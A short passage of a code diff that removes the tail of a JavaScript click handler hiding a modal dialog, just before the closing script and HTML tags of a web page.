-                if(modalId) {
-                    document.getElementById(modalId).style.display = 'none';
-                }
-            });
-        });
-
     </script>
 </body>
 </html>
